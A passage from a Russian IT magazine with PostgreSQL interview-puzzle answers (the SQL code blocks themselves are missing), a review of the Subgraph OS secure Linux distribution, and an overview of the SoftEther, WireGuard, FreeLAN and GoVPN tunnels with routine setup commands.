кодах или на интерпретируемом языке, предназначенная для запуска на це-
левой архитектуре. Выполненный SFX-архив распаковывает содержащиеся в
нем файлы в текущую директорию.
  Необходимо написать программу-конвертер, которая может автоматиче-
ски преобразовывать SFX-архивы в RPM-пакет. Предполагается, что SFX-ар-
хив будет запускаться в корне файловой системы, а результат установки
RPM-пакета должен полностью соответствовать такому запуску, не считая до-
полнительных изменений rpmdb. Требуется, чтобы сконвертированный пакет
содержал уже распакованные файлы, а не сам архив.
  В задании приведены два примера SFX-архивов, но программа-конвертер
не должна опираться на знание о конкретных форматах архивов.

Куда слать ответы?
Правильные ответы принимает Анна Зуева (azueva@virtuozzo.com).

Награждение победителя
Лучше всех с решением задач от Postgres справился Андрей Асякин. Он кру-
той, поздравляем победителя! Андрей получает бесплатный билет на все три
дня международного форума PgConf.Russia, который Postgres Professional бу-
дет проводить 15–17 марта 2017 года в Москве.

Ответы на задачи от Postgres Professional
xakep.ru/2016/08/11/coding-challenges-211/

Задача 1





Нам потребуется индекс post(usr_id,added). Запрос «в лоб»:





приведет к тому, что будут сначала выбраны все сообщения от друзей (то есть
если у друга 1000 постов, то вся 1000 и окажется получена), отсортированы
(также все) и только потом определен первый десяток. В предлагаемом отве-
те будет получено максимум 10 постов от каждого друга (мы должны преду-
смотреть и вариант, когда все 10 последних постов написал только один друг).

Задача 2
Можно ли в строке, состоящей из символов ( и ), проверить баланс скобок?
Как?
   Очень просто — сначала превратим строку в таблицу:





после чего для каждой открывающей скобки будем выдавать единицу, а для
закрывающей — -1. Обрати внимание на предложение with ordinality — оно по-
зволяет получить, кроме собственно значений, еще и их порядковый номер (в
данном случае pos). Вообще говоря, даже без этого предложения мы получим
корректный результат, и его использование в данном случае почти буквоед-
ство, но кто знает, как в будущем станут возвращаться строки?
   Посчитаем промежуточные суммы для этого выражения:





(tokens — имя таблицы со скобками).
   Понятно, что для корректной последовательности скобок, во-первых, чис-
ло закрывающих скобок должно быть равно числу открывающих и, во-вторых,
слева от любой закрывающей скобки число открывающих скобок должно быть
не меньше, чем число закрывающих – 1; то есть рассматривается случай ')(' и
подобные.
  Соберем все вместе:





Кстати, интересное решение предложил один из читателей: (из строки пред-
варительно удаляются все символы, отличные от ( и )):





В нем он удаляет все пары '()' до тех пор, пока они встречаются; если получи-
лась пустая строка, то баланс скобок соблюден.

Задача 3
Это происходит в том случае, когда ищут бульдозериста-женщину или нянеч-
ку-мужчину. PostgreSQL ведет статистику только по колонкам, а не по парам
(тройкам и так далее), отчего рассчитывает, что нужные строки будут получены
практически сразу, и потому ошибочно выбирает последовательное сканиро-
вание.
   Исправить можно просто построением индекса и по occupation, и по sex.

Задача 4
При вставке строки в такую схему накладывается блокировка FOR KEY SHARE;
она подобна блокировке FOR  SHARE, за тем исключением, что блокируются
только колонки, входящие в первичный ключ / ограничение уникальности.

Задача 5
Для одного запроса — а тут только один запрос — вполне достаточно стан-
дартного уровня изоляции READ COMMITTED. При таком уровне изоляции каж-
дый запрос видит согласованный снимок базы данных; если бы было несколь-
ко запросов в транзакции, то уровень изоляции пришлось бы повышать, но так
как запрос один, этого не требуется.

Задача 6
Данный запрос некорректен, так как в случае параллельной работы несколь-
ких соединений могут возникать конфликты. На самом деле его нетрудно пре-
образовать в корректный — например, обернув в цикл и обрабатывая ошибку
unique_violation:





Также можно использовать конструкцию insert ... on  conflict(...) do
update;. К сожалению, это не всегда срабатывает — при наличии более од-
ного ограничения уникальности (например, primary key и unique) могут также
возникать ошибки с нарушением уникальности; впрочем, описанный подход
должен работать и в таком случае.

Задача 7
Триггер некорректен сразу по нескольким причинам.
   Во-первых, так как каждая сессия видит только данные, которые уже были
зафиксированы другими транзакциями, то вполне существует вероятность
того, что две транзакции вставят одно и то же значение.
   Во-вторых, если триггер создан как триггер before, то он должен вернуть
какое-то значение (обычно new для добавления/обновления строки или null,
если операции со строкой требуется пропустить).
   Однако нередко возникает задача обеспечить уникальность сразу в не-
скольких таблицах — например, колонка id должна быть уникальна как в та-
блице t1, так и в таблице t2. В таком случае можно предложить использовать
advisory-блокировки и перед проверкой блокировать значение id, например так:





Хотелось бы обратить внимание на  то, что используется функция pg_
advisory_xact_lock, то есть блокировка будет снята при окончании транзак-
ции и потому нет опасности случайно забыть снять блокировку.
  Кроме того, если триггер выше подходит для случая вставки в таблицу, то
для обновления его следует модифицировать (примечание: предполагается,
что колонка col имеет тип int; значение 10000 в вызове функции pg_advisory_
xact_lock взято для примера).

Задача 8
Блок выдаст значение ER000, потому что sqlstate, заканчивающийся на 000,
определяет не ошибку, а класс ошибок и потому может обрабатывать ошиб-
ки и ER001. Кроме того, при возникновении исключения обработчики исклю-
чения просматриваются сверху вниз и используется первый подходящий. Ко-
нечно, обработка исключений в PL/pgSQL далека, скажем, от Java, но в то же
время предоставляет довольно широкие возможности — с ошибкой можно
установить многие дополнительные параметры, получить стек вызовов.
   Следует также отметить, что с помощью работы с исключительными ситуа-
циями в PL/pgSQL организована работа с точками сохранения (savepoints).

IT-компании, шлите нам свои задачки!
Миссия этой мини-рубрики — образовательная, поэтому мы бесплатно публи-
куем качественные задачки, которые различные компании предлагают соиска-
телям. Вы шлете задачки (lozovsky@glc.ru) — мы их публикуем. Никаких актов,
договоров, экспертиз и отчетностей. Читателям — задачки, решателям — по-
дарки, вам — респект от нашей многосоттысячной аудитории, пиарщикам —
строчки отчетности по публикациям в топовом компьютерном журнале.
   UNIXOID





          Евгений Зобнин
            zobnin@gmail.com
СНОУДЕНОДОБРЯЕТ


  ПЕРВЫЙ ВЗГЛЯД НА ЗАЩИЩЕННЫЙ
   LINUX-ДИСТРИБУТИВ SUBGRAPH OS


    Как создать защищенную ОС с нуля? Взять memory safe
    язык программирования, написать на нем высокоуровне-
   вые части ядра, поверх него положить концепцию замкну-
    тых песочниц и единый канал связи между песочницами и
   ОС, а все сетевое взаимодействие наладить через некую
    разновидность VPN. Как сделать защищенной уже суще-
   ствующую ОС? Попробовать прилепить все это к ней и
    постараться ничего не сломать по пути.

    Дисклеймер
     Честно говоря, изначально Subgraph OS не произвела на меня никакого впе-
     чатления. Очередной проект, ставящий своей целью разместить пользова-
     тельский софт в песочницах и таким образом достигнуть каких-то непонятных
     уровней защищенности ОС. Нет, ребята, в Qubes OS все это уже реализовано,
     причем на самом низком уровне, на уровне гипервизора Xen, да еще и с изо-
     ляцией сетевого стека и слоя работы с накопителями. Однако, следя за раз-
     витием проекта, я начал замечать движение в правильную сторону. Песочницы
     оказались далеко не так просты, как представлялось, а система обрела мно-
     жество других правильных черт, в том числе ядро с включенными патчами PaX/
      Grsecurity и прокси-слой, который пропускает трафик приложений через Tor,
     анонимизируя его источник.
      В целом операционка начала обретать черты из коробки защищенной си-
     стемы, которую гипотетический пользователь может поставить и просто юзать,
     не вникая в детали того, как это все работает. А это уже тянет если не на пре-
     мию, то как минимум одну статью в одном русскоязычном журнале. Тем более
     Сноуден уже высказался, почему нельзя мне?

    Где взять?
     Subgraph OS до сих пор находится в стадии активной разработки, поэтому
     для загрузки доступна только alpha-версия. Скачать ее можно с официальной
     страницы, размер ISO-образа 1,4 Гбайт, для установки пригоден практически
    любой комп с не менее чем 2 Гбайт оперативки, в том числе виртуальная ма-
    шина на базе VirtualBox или VMware.
        Устанавливается все это дело с помощью обычного инсталлятора Debian, а
     в качестве рабочего стола выступает немодифицированный GNOME 3. Конеч-
     но же, имеется набор предустановленных приложений: плеер VLC, офисный
     пакет LibreOffice, почтовый клиент IceDove и другие, плюс стандартные репо-
     зитории, из которых можно ставить любой софт с помощью apt-get.
        Так что внешне и по уровню user experience операционка практически ни-
     чем не отличается от типичного дистрибутива Linux. Но в самой основе систе-
    мы есть множество различий.





                                                     Стандартный инсталлятор Debian

    Песочницы
     Ключевая идея Subgraph OS — запуск пользовательских приложений в изоли-
     рованных песочницах. Для этого задействована подсистема Oz, состоящая из
     демона (системного сервиса), получающего запросы на создание sandbox’ов,
     X-сервера Xpra и набора специальных утилит.
      В своей основе Oz очень сильно напоминает Firejail, о котором мы уже рас-
     сказывали в статье «Игры с песочницей». Для изоляции приложений Oz приме-
     няет пространства имен, дополнительно ограничивая доступные приложению
     системные вызовы с помощью механизма seccomp-bpf. Общение приложения
     с графической подсистемой осуществляется с помощью виртуального X-сер-
     вера Xpra, который запускается внутри каждой песочницы. X-сервер основной
     системы подключается к Xpra и выводит картинку приложения на экран. Это
     очень важный момент, так как стандартный метод запуска графических при-
     ложений в песочницах — это прокидывание сокета X-сервера /tmp/.X11-unix/
     X0 в саму песочницу, что открывает запущенному в песочнице приложению
     возможность не только выводить картинку на экран и обрабатывать события
     устройств ввода, но и получать доступ к любому окну любого другого приложе-
     ния и перехватывать любые клавиши. Xpra решает эту проблему.
      В целом запуск приложения в Subgraph OS выглядит примерно так:
      1. Юзер кликает на иконку приложения или запускает его с помощью команд-
       ной строки.
      2. Управление получает Oz, так как настоящий исполняемый файл приложения
        находится в каталоге /usr/bin-oz/, а тот, что запускает юзер, — это всего
       лишь симлинк на /bin/oz.
      3. Oz получает имя приложения, читая первый аргумент (он всегда содержит
       имя исполняемого файла), и через сокет отдает демону oz-daemon команду
        запустить приложение.
      4. Демон читает профиль приложения, в котором указано, что ему разрешено/
        запрещено, какие файлы домашнего каталога доступны и так далее.
      5. Демон создает каталог /srv/oz/rootfs/, подключает к нему каталоги /bin, /lib,
          /lib64, /usr и /etc основной системы, создает другие необходимые каталоги:
          /var, /tmp, /mnt и так далее, создает минимальный набор нужных для работы
       приложения файлов-устройств в /dev, подключает другие приложения фай-
       лы и каталоги, далее выполняет chroot в этот каталог и создает новые про-
        странства имен, запирающие приложение в песочницу.
      6. Демон выделяет для песочницы новый виртуальный сетевой интерфейс и
        подключает его к виртуальному свитчу, подсоединенному к внешнему сете-
       вому интерфейсу машины.
      7. Далее демон запускает внутри песочницы oz-init, который запускает Xpra и
        использует seccomp-bpf для настройки запрета/разрешения на выполне-
       ние системных вызовов.
      8. Oz-init запускает приложение из каталога /usr/bin-oz/.

     Все это очень похоже на то, что мы делали в статье про создание собственных
     песочниц, с тем исключением, что вместо создания окружения исполнения
     для приложения с нуля (то есть прямого копирования нужных для его работы
     файлов в песочницу) Oz просто «пробрасывает» все файлы основной системы
     в песочницу с помощью bind() (системный вызов, позволяющий подключить
     один каталог к другому). Плюс, конечно же, те самые seccomp-bpf и Xpra.





                                                                   Запуск приложения


     Если запущенное в песочнице приложение будет скомпрометировано, оно не
     сможет ни выбраться из песочницы, ни навредить основной системе — хоть
     каталоги системы и подключаются внутрь песочницы, они недоступны для за-
     писи. Информация также останется в сохранности, так как взломщик/малварь
     сможет добраться разве что до конфигов приложения и различных кешей. Бо-
     лее того, тот же просмотрщик PDF (Evince) не может открыть любой документ,
     вместо этого он получит доступ только к файлу, для просмотра которого был
     запущен (юзер кликнул на документ в проводнике).





                                         Oz размещает апплет в трее, с помощью которо-
                                               го в песочницу можно закинуть нужные файлы

    В общем, вполне очевидная и простая, но хорошая архитектура. Проблема
     только в том, что в данный момент Subgraph OS использует Oz для запуска
     всего восемнадцати приложений, в число которых входят защищенный мес-
     сенджер CoyIM, почтовый клиент IceDove (Mozilla Thunderbird), офисный па-
      кет OpenOffice, IRC-клиент HexChat, VLC и Tor Browser (для сравнения: в том
    же Firejail есть настройки для запуска почти сотни различных приложений).
     Остальные работают без всяких песочниц.





                                                Восемнадцать профилей Oz из коробки


    Прозрачное проксирование через Tor
     Вторая важная особенность Subgraph OS — это проксирование всего исходя-
     щего трафика через Tor. По умолчанию Tor не поддерживает такую конфигура-
    цию и представляет собой всего лишь SOCKS-прокси, то есть требует, чтобы
     приложение явно поддерживало SOCKS, а пользователь самостоятельно на-
     строил проксирование приложения через Tor.
        Разработчики Subgraph OS обошли эту проблему с помощью Metaproxy,
     перенаправляющего весь переданный на его порт трафик на адрес указанного
    SOCKS- или HTTP-прокси (в данном случае Tor), и простого правила брандма-
      уэра, перенаправляющего весь исходящий трафик на порт Metaproxy (8675),
     делая исключение только для порталов аутентификации публичных сетей Wi-Fi.





                                                 Настройки брандмауэра Subgraph OS

    В качестве браузера Subgraph OS использует стандартный, никак не модифи-
     цированный Tor Browser. Это единственное приложение, использующее Tor
     напрямую, весь остальной софт, включая Wget, отдает трафик Metaproxy. ICMP
     запрещены в любую сторону, так что операционка не только не отвечает на
      пинги, но и не позволяет пропинговать другой хост.





                                                                                   Tor Browser

    Брандмауэр
    В Subgraph OS интегрирован собственный брандмауэр, точнее графическая
     надстройка над iptables с диалоговым интерфейсом: стучится приложение,
     куда не надо, — на экране появляется диалог с просьбой разрешить или за-
     претить соединение.

    PaX/Grsecurity
    Ядро Subgraph OS собрано с патчами PaX и Grsecurity, это значит, что оно из
     коробки включает в себя средства, затрудняющие выполнение атак, направ-
     ленных на переполнение буфера. В первую очередь это пометка стека и об-
     ласти данных приложений как неисполняемых, а области кода как непереза-
     писываемой, а также технология ASLR (Address Space Layout Randomization),
    размещающая стек, область кода и данных приложений по случайным адре-
     сам в оперативной памяти.
        Также Grsecurity включает в себя ряд средств, направленных на повышение
     безопасности ядра в целом. Это существенные ограничения для приложений,
     исполняемых в chroot (который используется для создания песочниц), запрет
     на исполнение бинарных файлов, не принадлежащих пользователю root, за-
     прет на изменение текущего времени и даты, скрытие информации в файло-
     вой системе /proc, выводе dmesg, ограничения на использование FIFO-кана-
     лов и сокетов и другие.
       Некоторые компоненты Subgraph OS напрямую завязаны на Grsecurity. На-
     пример, демон USBLockout использует функцию запрета на подключение лю-
     бых устройств, чтобы не допустить подключения к компу любых USB-устройств,
     пока он заблокирован.

    Нереализованные функции
    Зашифрованный диск. Разработчики заявляют о том, что операционка ис-
     пользует принудительное шифрование данных. На самом деле это не так, по
     крайней мере пока. Инсталлятор может поставить Subgraph OS, используя лю-
     бую конфигурацию диска, в том числе на один раздел без применения шифро-
     вания. Но можно выбрать и установку на логический том LVM, зашифрованный
     с помощью dm-crypt. Иными словами, никаких отличий от других дистрибутивов
      Linux.
       Subgraph Mail. Во всех документах о дизайне ОС авторы Subgraph OS за-
     являют об использовании написанного с нуля почтового клиента с поддержкой
     OpenPGP. Это тоже неправда, операционка использует стандартный почтовый
     клиент IceDove с плагином Enigmail, а разработка собственного клиента, судя
     по всему, уже давно заброшена.
       Доверенная загрузка. Еще одно громкое заявление разработчиков.
     Subgraph OS якобы использует технологию доверенной загрузки (Chain of
       trust), предполагающую защиту от загрузки ОС в случае ее внешней модифи-
     кации. Для этого обычно используются зашифрованный загрузочный раздел,
     подписанные цифровым ключом ядро и RAM-диск, контрольные суммы файло-
     вых систем. В данный момент ничего подобного в Subgraph OS нет, операци-
     онка грузится обычным загрузчиком Grub, который передает управление ядру
     без всяких сверок цифровых подписей.





                                                 Выбор вариантов разбивки диска

   Выводы
     Subgraph OS — всего лишь альфа, но даже для альфы она выглядит очень
     бедно. Внимания заслуживает разве что система прозрачного проксирования
     трафика через Tor, но в этом нет ничего нового, та же система есть в ОС TAILS
     и Whonix.
       Система запуска приложений в песочницах, несмотря на свою вторичность,
     неплоха, но в данный момент используется только для небольшого числа «из-
     бранных» приложений. Включенные в состав ядра патчи Grsecurity — правиль-
     ная вещь, но опять же реализованная в десятках других систем, включая древ-
     ний как мир Hardened Gentoo.
       Остальные функции пока просто не реализованы, так что ничего лучше ста-
     рой доброй Qubes OS у нас до сих пор нет.
UNIXOID
СТРОИМ
ТУННЕЛИ
 РАЗБИРАЕМСЯ
 С НОВИНКАМИ
 VPN


                                                                          Мартин
                                                                                                     «urban.prankster»
                                                                             Пранкевич
                                                                                         prank.urban@gmail.com





При работе с облачными сервисами важна не только ско-
рость обработки и передачи данных — на первое место
выдвигается гарантированный уровень безопасности.
Данные, хранящиеся на внешнем ресурсе, ни в коем слу-
чае не должны попасть в чужие руки. C другой стороны,
постоянно появляются сообщения о попытках государств
что-нибудь да заблокировать. Наверное, поэтому в по-
следнее время вырос интерес к VPN-решениям, и наряду
с уже традиционными IPsec/XFRM и OpenVPN в Linux ста-
ли активно развиваться еще несколько проектов. Сегодня
тебя ждут четыре интересных экземпляра: SoftEther VPN,
WireGuard, FreeLAN и GoVPN.

SoftEther VPN
SoftEther VPN — академический проект японского Цукубского университета
(University of Tsukuba), распространяемый под лицензией GPLv2. Главной его
особенностью является поддержка нескольких VPN-протоколов, совместимых
с оригинальными клиентами. Это позволяет вместо парка серверов из про-
приетарных и open source решений использовать для подключения клиентов,
работающих под управлением разных ОС, одно приложение. И просто выби-
рать нужный протокол в зависимости от конкретной ситуации. Поддержива-
ются: SSL-VPN (HTTPS), IPsec, L2TP, MS-SSTP, L2TPv3, EtherIP и OpenVPN.
SoftEther VPN работает в режимах remote-access и site-to-site, на уровнях L2
(Ethernet-bridging) и L3 (IP). В случае замены OpenVPN мы получаем более
простую конфигурацию. Есть генератор ovpn-файлов для быстрого подключе-
ния VPN-клиента. Замена SSTP VPN позволяет отказаться от использования
серверов на базе Win2k8/2012, требующих лицензии. Собственный протокол
обеспечивает прохождение Ethernet поверх HTTPS (отсюда и название проек-
та — Software Ethernet), характеризуется хорошей пропускной способностью
и низкой латентностью. Его использование дает возможность прозрачно сое-
динить несколько Ethernet-сетей в одну, то есть отпадает необходимость в до-
полнительных решениях Ethernet-over-IP.
  И главное — он совместим с NAT и работает через стандартный 443-й порт,
который обычно не блокируется брандмауэрами провайдеров. Эта возмож-
ность позволяет скрыть вообще использование VPN: со стороны трафик вы-
глядит как обычный и не обнаруживается технологиями Deep Packet Inspection.
Собственно, поэтому он и стал очень популярен в Китае, где его используют
для обхода Великого китайского файрвола. При этом на стороне клиента реали-
зован виртуальный сетевой адаптер Ethernet, а на сервере — виртуальный ком-
мутатор. Большой плюс — наличие NAT Traversal, включенной по умолчанию, то
есть не нужно просить админа открыть доступ к VPN-серверу, находящемуся во
внутренней сети. Но и это еще не все. В сетях с ограниченным доступом, у кото-
рых блокируются все TCP- и UDP-пакеты (например, публичные Wi-Fi), для соз-
дания VPN можно использовать протоколы ICMP и DNS, обычно не блокируе-
мые брандмауэром. Поддерживается Dynamic DNS, позволяющий получить
доступ при динамически меняющемся IP-адресе. Для этого реализован сервис
VPN Gate, называемый VPN Azure Cloud Service, — к нему можно организовать
соединение из внутренней сети и затем при необходимости свободно попадать
внутрь сети. Клиентская часть содержит специальный плагин VPN Gate, позво-
ляющий отслеживать смену IP и быстро подключаться к VPN Gate.
   Обеспечивается высокая производительность и скорость соединения
1 Гбайт/с без существенных ограничений по объемам ОЗУ и минимальной на-
грузке на процессор. Поэтому требования к серверной части очень невысо-
ки. По тестам SoftEther VPN обходит на том же оборудовании оригинальные
решения. Поддерживается шифрование AES-256 и RSA-4096, IPv4/IPv6, жур-
налирование трафика и событий. Аутентификация пользователей локальная,
RADIUS и домен Windows.
   Администрирование учетных записей и параметры безопасности могут быть
настроены удаленно с помощью графического интерфейса Server Manager (ло-
кализация только английский, японский и китайский), который устанавливает-
ся на Win- или macOS-компьютере администратора или при помощи утили-
ты командной строки vpncmd. Возможна установка на Windows, Linux, macOS,
FreeBSD и Solaris. Доступен исходный код и архив со скомпилированным при-
ложением. Для установки потребуется выбрать ОС, платформу и компонент
(сервер, клиент, bridge...). Официально поддерживаются Linux-ядра 2.4/2.6/3.x,
но без проблем работает и в современных дистрибутивах с ядром 4.х. В Linux
достаточно распаковать архив и запустить файл .install.sh, после чего раза три
принять условия лицензии и по окончании запустить сервер:

$ sudo ./vpnserver start

Далее, отвечая на вопросы vpncmd (или при помощи Server Manager), настра-
иваем параметры подключения.





                 Управлять SoftEther VPN можно при помощи графического интерфейса

WireGuard
WireGuard — результат исследований автора проекта Джейсона Доненфил-
да (Jason A. Donenfeld), главы компании Edge Security. Продукт со встроен-
ной криптографией, одновременно простой в использовании и в реализации
(чуть более 4000 строк кода), что существенно выделяет его среди остальных
решений. Например, его код легче проанализировать, чем все, что написано
в рамках *Swan/IPsec или OpenVPN. Самый молодой проект обзора. О нем за-
говорили в середине лета 2016-го после публикации анонса в списке рассыл-
ки разработчиков ядра Linux, где был представлен патч к ядру. Хотя сам проект
развивается уже несколько лет и прошел стадию рецензирования криптогра-
фии, то есть его можно внедрять в основное ядро.
   VPN-соединение инициализируется (handshake) путем обмена открытыми
ключами и напоминает подход, применяемый в SSH. Все остальное прозрач-
но обрабатывается WireGuard, нет необходимости беспокоиться о ключах, ро-
утинге, контроле состояния и прочем, это все забота WireGuard. Возможно
использование симметричного шифрования, но это потребует чуть больших
настроек. Маршрутизация производится по ключам шифрования, для этого
к каждому сетевому интерфейсу привязывается закрытый ключ. Для обновле-
ния ключей handshake происходит через определенное время или по сигналу,
что ключи устарели. Для согласования ключей и соединения вместо собствен-
ного демона в пространстве пользователя используется механизм Noise_IK
из Noise Protocol Framework, похожий на поддержание authorized_keys в SSH,
без усложнений в виде поддержки x509 и ASN.1.
   Для шифрования применяются потоковый шифр ChaCha20 и алгоритм ау-
тентификации сообщений (MAC) Poly1305. Для генерации совместного се-
кретного ключа — протокол Диффи — Хеллмана на эллиптических кривых
в реализации Curve25519, предложенной Дэниелом Бернштейном. Для хеши-
рования используются BLAKE2s (RFC 7693) и SipHash-2-4. Избежать replay-а-
таки позволяет метка времени TAI64N, пакеты с меньшей меткой времени от-
брасываются.
   Передача данных осуществляется на третьем уровне ISO через инкапсуляцию
в пакеты UDP. Поддерживаются IPv4 и IPv6, инкапсуляция v4 в v6 и v6 в v4. Может
работать за NAT и файрволом. Поддерживается смена IP-адреса VPN-сервера
без разрыва соединения с автоматической перенастройкой клиента.
   После установки в системе появляется новый сетевой интерфейс wg0,
который может быть настроен штатными инструментами ipconfig/ip-address
и route/ip-route. Специальная утилита wg позволяет установить секретный ключ
устройства и указать список ассоциаций для клиентов (его публичный ключ,
разрешенный IP).
   Для установки понадобится дистрибутив с ядром Linux >4.1. Пакет можно
найти в репозиториях основных дистрибутивов Linux. Для Ubuntu 16.04 есть PPA.

$ sudo add-apt-repository ppa:hda-me/wireguard
$ sudo apt update
$ sudo apt install wireguard-dkms wireguard-tools

Самостоятельная сборка из исходных текстов также несложна. Поднимаем ин-
терфейс, генерируем пару ключей (для примера сохраняем в файлах privatekey
и publickey):

$ sudo ip link add dev wg0 type wireguard
$ wg genkey | tee privatekey | wg pubkey > publickey

Получаем публичный ключ от клиента и создаем соединение.

$ sudo wg set wg0 listen-port 1234 private-key ~/privatekey peer
    IKy1eCE9pP1w... allowed-ips 192.168.0.0/24 endpoint 1.2.3.4:9876

Возможно  использование  PresharedKey  (генерируется  командой  wg
genpsk), который добавляет еще один уровень симметричного шифрова-
ния к имеющемуся шифрованию с открытым ключом. Для пира можно указать
PersistentKeepalive, позволяющий поддерживать соединение из-за NAT и фай-
рвола. Поднимаем интерфейс:

$ sudo ip address add dev wg0 192.168.0.1

Смотрим настройки:

$ sudo wg

Для удобства лучше заранее подготовить конфигурационный файл, содержа-
щий секцию interface и секции peer. Формат можно увидеть, введя wg showconf.

$ sudo wg setconf wg0 myconfig.conf

Подходит как для небольших встроенных устройств вроде смартфонов, так
и для магистральных маршрутизаторов. Тесты показали, что WireGuard имеет
примерно в четыре раза лучшую пропускную способность и в 3,8 раза более
отзывчив по сравнению с OpenVPN (256-bit AES c HMAC-SHA-2–256). Здесь
сказывается не только реализация в виде модуля ядра, тогда как OpenVPN ра-
ботает в userspace. Повышение производительности обусловлено отказом
от использования CryptoAPI ядра, работающего достаточно медленно. Вместо
него в WireGuard задействованы собственные реализации ChaCha20, Poly1305,
BLAKE2s и Curve25519, которые позиционируются как быстрые и безопасные
аналоги AES-256-CTR и HMAC, их программная реализация позволяет добить-
ся фиксированного времени выполнения без аппаратной поддержки.
   Также WireGuard благодаря меньшим задержкам чуть лучше выглядит в про-
изводительности по сравнению с IPsec (256-bit ChaCha20 + Poly1305 и AES-
256-GCM-128), но вот настройки гораздо проще.
   Пока WireGuard доступен только для Linux, после тестирования предпола-
гается портировать в другие ОС. Код распространяется под лицензией GNU
GPLv2.





                                                         Настройка WireGuard





                                            Смотрим конфигурацию WireGuard

FreeLAN
FreeLAN — мультиплатформенный VPN-клиент, который распространяется
по лицензии GNU GPL и относится к так называемому классу Full Mesh, то есть
использует P2P-технологии. Проект относительно молодой, активно начал про-
двигаться только с 2013 года. Его главное отличие от других проектов — это
выбор варианта архитектуры: клиент-серверная (как привычный VPN, клиен-
ты в зависимости от установок могут или не могут обмениваться данными друг
с другом, сервер может выступать как релей), P2P (клиенты подключаются друг
к другу напрямую) и смешанный (оба варианта). Таким образом, можно гибко
настроить VPN практически под любые условия. Например, сервер может по-
надобиться, чтобы получать доступ во внутреннюю сеть или для контроля сое-
динений, в остальных случаях можно позволить подключаться напрямую.
  Основой служит собственный протокол FSCP (FreeLAN Secure Channel
Protocol), базирующийся на UDP. Может работать как на уровне Ethernet, уста-
навливая прямые Ethernet-соединения между узлами, так и на уровне IPv4/
IPv6. Предусмотрена авторизация по секретному слову и по X.509-серти-
фикатам, минимальный размер открытого ключа RSA — 1024 бит, рекомен-
дуемый — 2048 бит, в качестве симметричного ключа используется AES-256.
Сессии имеют ограниченный срок службы, после окончания которого переза-
пускаются, сообщения содержат счетчики и контролируют время, что позво-
ляет избежать replay-атак. Для поддержания сеанса отправляются сообщения
keep-alive. Заголовок сообщения подписывается частным ключом или HMAC-
SHA-256, если используется pre-shared-ключ. В общем, выбор в настройках
очень большой.
   Поддерживаются Win, Linux, macOS, Raspberry Pi. Пакет есть в репозито-
риях основных дистрибутивов, поэтому установка сложностей не вызывает.
По факту программа представляет собой один бинарник, поэтому создавать
сети очень просто.

$ freelan --security.passphrase "secret"

По умолчанию сервер откроет порт UDP/12000 на всех интерфейсах, вирту-
альный интерфейс получит адрес 9.0.0.1. Используя дополнительные пара-
метры, их можно переопределить, как и указать сертификаты. Подключаемся
к серверу с другого узла, присвоим ему другой внутренний IP:

$ freelan --security.passphrase "secret" --fscp.contact
    1.2.3.4:12000 --tap_adapter.ipv4_address_prefix_length 9.0.0.2/24

Для удобства все настройки можно поместить в конфигурационный файл.
При установке в Ubuntu уже есть готовый шаблон /etc/freelan/freelan.cfg, кото-
рый будет прочитан при запуске, а поэтому лучше сразу внести в него параме-
тры. Альтернатива FreeLAN — PeerVPN или Cjdns, в которых также используют
распределенные технологии.





                                                Поднимаем сервер FreeLAN





                                            Конфигурационный файл FreeLAN

GoVPN
GoVPN — легкий и простой в настройке демон VPN, предназначенный для соз-
дания шифрованных и аутентифицированных каналов связи поверх UDP или
TCP. Среди задач проекта — безопасный код, который легко читать и анализи-
ровать, безопасность, устойчивость к DPI/цензуре. Фактически GoVPN просто
туннелирует кадры Ethernet — ни больше ни меньше. Нет никаких особых ин-
струментов для управления IP, но для этого можно самостоятельно написать
скрипты. Использует TAP сетевые интерфейсы, в настройках можно задавать
его имя. MTU конфигурируются относительно каждого клиента отдельно. На-
писан на языке Go и распространяется под лицензией GPLv3. Для согласова-
ния ключей используется протокол с двусторонней аутентификацией сторон
по парольной фразе (PAKE DH A-EKE: Diffie — Hellman Augmented Encrypted
Key Exchange). Клиент для подключения вводит парольную фразу, на сервер-
ной стороне хранится верификатор, который нельзя использовать с клиент-
ской стороны, поэтому даже при взломе сервера хакер не может выдавать
себя за клиента.
   Реализовано три режима работы:
•  обычный (применяется по умолчанию), когда в сеть идут просто зашифро-
   ванные пакеты;
•  noise (шумовой), когда пакеты дополняются шумом до постоянной длины;
• CPR (постоянной скорости) — в дополнение к noise пакеты отправляются
   строго через определенный промежуток, если нет полезной информации,
   отправляется шумовой пакет.

В последних двух режимах благодаря генерированию постоянного шумово-
го трафика удается скрывать длину сообщений и сам факт передачи полез-
ной нагрузки. Имеет свойство нулевого неразглашения, при котором невоз-
можна offline-атака по словарю, устойчив к replay-атакам через использование
одноразового кода аутентификации сообщения (message authentication code)
и синхронизацию времени (опционально). Предусмотрена ротация сессионных
ключей и отправка heartbeat для поддержания работы через NAT или файрвол.
Для хеширования парольных фраз задействован Balloon (в релизе 6.0). В рели-
зе 5.0 это был Argon2d, еще ранее PBKDF2. Поэтому версии несовместимы.
   Есть нешифрованный режим, также обеспечивающий конфиденциальность
и аутентичность данных благодаря технологии chaffing and winnowing. Он по-
зволяет обойти ограничения на использование криптографических инстру-
ментов в некоторых странах. Вместо шифрования применяются алгоритмы
аутентификации и передача множества лишних пакетов (получатель просто
отбирает те, которые ему подходят). Но это увеличивает каждый пакет на 4128
байт, поэтому режим требователен и к процессору, и к лишнему передавае-
мому трафику.
  Совместим с IPv4 и IPv6. Возможно подключение через внешний HTTP-прок-
си, клиент также имеет встроенный режим HTTP-прокси, который можно ис-
пользовать для доступа к серверу. Для получения статистики о подключенных
клиентах в режиме реального времени в JSON-формате используется встро-
енный HTTP-сервер. Поддерживается работа в GNU/Linux и FreeBSD. Сервер
конфигурируется с использованием YAML-файла.
   Готовых пакетов проект не предлагает, только исходные тексты, для сбор-
ки понадобятся пакеты uml-utilities и golang. Хотя неофициальные порты поя-
вились уже в некоторых дистрибутивах. Дистрибутив постоянно развивается,
и часть инструкций по настройке уже недействительна.





                                                    Настройка клиента в GoVPN

Заключение
Каждое из представленных решений имеет свои плюсы, стоит присмотреться
и выбрать нужное в зависимости от планируемых задач.
COVERSTORY
VIRTUOZZO
НА ПАЛЬЦАХ





          ИНТЕРВЬЮ
          С АЛЕКСЕЕМ КОБЦОМ,
           ВИЦЕ-ПРЕЗИДЕНТОМ
         ПО РАЗРАБОТКЕ VIRTUOZZO



 «Что? Еще одна система виртуализации? Но я же толь-
 ко осилил Docker!» — скажешь ты и будешь прав. Виртуа-
 лизация везде, и новых инструментов в этой сфере масса.
Но Virtuozzo и бесплатный OpenVZ — проекты не новые, их
 пилят уже больше десяти лет. При этом информации в до-
